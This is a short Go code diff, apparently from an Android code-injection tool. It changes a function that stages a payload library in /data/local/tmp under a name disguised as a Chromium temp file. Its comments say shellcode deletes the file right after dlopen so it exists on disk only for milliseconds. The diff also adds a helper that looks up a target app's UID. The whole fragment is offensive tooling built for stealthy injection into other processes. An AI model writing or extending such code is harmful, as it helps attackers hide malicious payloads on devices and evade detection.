@@ -117,18 +117,14 @@ func stageEphemeralPayload(pkgName string, srcPath string) (string, error) {
 		return "", err
 	}
 
-	appDataDir := filepath.Join("/data/data", pkgName)
-	if _, err := os.Stat(appDataDir); err != nil {
-		fallbackDir := filepath.Join("/data/user/0", pkgName)
-		if _, fallbackErr := os.Stat(fallbackDir); fallbackErr == nil {
-			appDataDir = fallbackDir
-		} else {
-			return "", err
-		}
-	}
+	// Stage into /data/local/tmp with an innocuous name.
+	// This path is universally accessible by the linker's default namespace.
+	// The shellcode will unlink the file immediately after dlopen succeeds,
+	// so it only exists on disk for milliseconds during the injection window.
+	stagingDir := "/data/local/tmp"
 
 	stagedName := fmt.Sprintf(".org.chromium.%s.tmp", hex.EncodeToString(randomBytes))
-	stagedPath := filepath.Join(appDataDir, stagedName)
+	stagedPath := filepath.Join(stagingDir, stagedName)
 	if err := os.WriteFile(stagedPath, payloadData, 0755); err != nil {
 		return "", err
 	}
@@ -138,6 +134,17 @@ func stageEphemeralPayload(pkgName string, srcPath string) (string, error) {
 	}
 
 	return stagedPath, nil
+}
+
+// getAppUid returns the numeric UID for an app's data directory.
+func getAppUid(pkgName string) int {
+	out, err := exec.Command("stat", "-c", "%u", fmt.Sprintf("/data/data/%s", pkgName)).Output()
+	if err != nil {
+		return 0
+	}
+	var uid int
+	fmt.Sscanf(string(out), "%d", &uid)
+	return uid
 }
 
 func cleanupStagedPayload(path string, logSuccess bool) {
